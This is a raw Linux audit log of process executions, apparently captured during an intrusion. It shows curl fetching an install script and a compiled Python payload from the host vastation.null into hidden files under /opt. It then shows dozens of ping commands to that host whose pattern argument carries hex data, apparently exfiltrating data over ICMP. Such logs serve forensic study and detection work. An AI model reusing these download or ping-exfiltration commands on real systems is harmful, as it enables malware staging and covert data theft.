type=EXECVE msg=audit(1742907868.476:1044): argc=2 a0="curl" a1="http://vastation.null:8080/install_nptdate.sh"
type=EXECVE msg=audit(1742907868.920:1175): argc=5 a0="curl" a1="-fsSL" a2="http://vastation.null:8080/ntpdate_util.cpython-37.pyc" a3="-o" a4="/opt/fJQsJUNS/.sys"
type=EXECVE msg=audit(1742907868.944:1176): argc=5 a0="curl" a1="-fsSL" a2="http://vastation.null:8080/readme.md" a3="-o" a4="/opt/fJQsJUNS/.rdme"
type=EXECVE msg=audit(1742907874.716:2551): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="9cd3eeb17306be91dcb3768cce0c0ee4" a5="vastation.null"
type=EXECVE msg=audit(1742907874.728:2555): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="1de7f3d826be311ec19fe33639941aab" a5="vastation.null"
type=EXECVE msg=audit(1742907874.736:2559): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="967123801ba641fbdc40add880e8ee8a" a5="vastation.null"
type=EXECVE msg=audit(1742907874.748:2563): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="098f05f2147eb8dde96d526e1ef51430" a5="vastation.null"
type=EXECVE msg=audit(1742907874.756:2567): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="d5b6e8ceed21a96a84e729b47c5e8963" a5="vastation.null"
type=EXECVE msg=audit(1742907874.768:2571): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="f62b2d17e2dfcc4cf92553d8b9dd13ab" a5="vastation.null"
type=EXECVE msg=audit(1742907874.776:2575): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="d0d3a5c70d6ac4e9d6e4adc56050f30c" a5="vastation.null"
type=EXECVE msg=audit(1742907874.788:2579): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="7240a6dc1cd5d51d6705e7aadb77ca57" a5="vastation.null"
type=EXECVE msg=audit(1742907874.796:2583): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="6faf6501acb543126baef6b8d033b83b" a5="vastation.null"
type=EXECVE msg=audit(1742907874.808:2587): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="c09d81824ac47ccd61283ac90fe0fe24" a5="vastation.null"
type=EXECVE msg=audit(1742907874.820:2591): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="d752129e983c1e965ff59985125dcdd4" a5="vastation.null"
type=EXECVE msg=audit(1742907874.828:2595): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="bd0488d3f117bc24ce2b27fdd00190ce" a5="vastation.null"
type=EXECVE msg=audit(1742907874.840:2599): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="bd2597bd9fa03b2a6597913eb0651f37" a5="vastation.null"
type=EXECVE msg=audit(1742907874.852:2603): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="601ce9f0a39d434550ef95bb5c325e5e" a5="vastation.null"
type=EXECVE msg=audit(1742907874.860:2607): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="ce983f827d54231eb14d0e08bdee97b8" a5="vastation.null"
type=EXECVE msg=audit(1742907874.872:2611): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="83276a7d778ccb7864a8a5c38c6bc5c1" a5="vastation.null"
type=EXECVE msg=audit(1742907874.884:2615): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="080078f9580ab116c43ebf18f0b2f7e4" a5="vastation.null"
type=EXECVE msg=audit(1742907874.896:2619): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="5db7c65a9c7ffbdac34594b7db81dcf4" a5="vastation.null"
type=EXECVE msg=audit(1742907874.908:2623): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="95a55364bd96ab8d58a04a68d5b94ed2" a5="vastation.null"
type=EXECVE msg=audit(1742907874.920:2627): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="764f832d4d4dc2dbf546d3e93a7bed57" a5="vastation.null"
type=EXECVE msg=audit(1742907874.928:2631): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="c1b288e7a000018db39cb3084afe99a6" a5="vastation.null"
type=EXECVE msg=audit(1742907874.940:2635): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="c720239081279df7aaf4815865358365" a5="vastation.null"
type=EXECVE msg=audit(1742907874.952:2639): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="cb7ef8e91a89e9b2d86d2e8522ff66a5" a5="vastation.null"
type=EXECVE msg=audit(1742907874.960:2643): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="46382bcd62e6cb752dbb2986391ea749" a5="vastation.null"
type=EXECVE msg=audit(1742907874.972:2647): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="d48c74e9fa6e2247ce5f2f1cdbf59711" a5="vastation.null"
type=EXECVE msg=audit(1742907874.980:2651): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="c87ad2f070dc3abdc080f636041e0f00" a5="vastation.null"
type=EXECVE msg=audit(1742907874.992:2655): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="d9353fa39be50372d6bc71f95a7e553c" a5="vastation.null"
type=EXECVE msg=audit(1742907875.000:2659): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="42c795dcfedf1f6404f8f8dd9653c8b1" a5="vastation.null"
type=EXECVE msg=audit(1742907875.012:2663): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="c284083ca7373e7e27c81beaa1eddacf" a5="vastation.null"
type=EXECVE msg=audit(1742907875.020:2667): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="7f7394ed105dc1f01a7f7a0e240dd1f7" a5="vastation.null"
type=EXECVE msg=audit(1742907875.032:2671): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="310c57d742cd040380156fa2be4c08ae" a5="vastation.null"
type=EXECVE msg=audit(1742907875.040:2675): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="28e3b781cdc643e874c60b4ecf171e73" a5="vastation.null"
type=EXECVE msg=audit(1742907875.048:2679): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="92123850f9dd436ecc72172ac68411e6" a5="vastation.null"
type=EXECVE msg=audit(1742907875.060:2683): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="1af73705c9d933bb137054080fd74474" a5="vastation.null"
type=EXECVE msg=audit(1742907875.068:2687): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="cb7ad5f20b699c2299cceb4cdfe79579" a5="vastation.null"
type=EXECVE msg=audit(1742907875.080:2691): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="c431c990a75739215c591901973ce3fe" a5="vastation.null"
